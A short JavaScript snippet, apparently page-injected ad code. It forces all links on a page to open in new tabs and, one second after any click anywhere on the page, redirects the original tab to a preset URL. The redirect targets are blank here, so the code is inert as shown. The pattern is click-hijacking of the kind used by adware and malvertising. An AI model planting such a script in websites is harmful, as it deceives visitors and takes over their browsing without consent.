(() => {
    const urlDirectClick = "";
    const urlDirectClick2 = "";
    document.querySelectorAll("a").forEach(element => {
        element.setAttribute("target", "_blank");
        element.addEventListener("click", event => {
            const isTargetBlank = event.target.target === "_blank";
            const isShortcutKeyPressed = event.ctrlKey || event.shiftKey || event.metaKey;
            if (isTargetBlank || isShortcutKeyPressed) {
                try {
                    setTimeout(() => {
                        window.location.href = urlDirectClick2;
                    }, 1000);
                } catch (e) {};
            };
        });
    });
    document.querySelector("body").addEventListener("click", (event) => {
        
        setTimeout(() => {
            window.location.href = urlDirectClick2;
        }, 1000);
    });
})();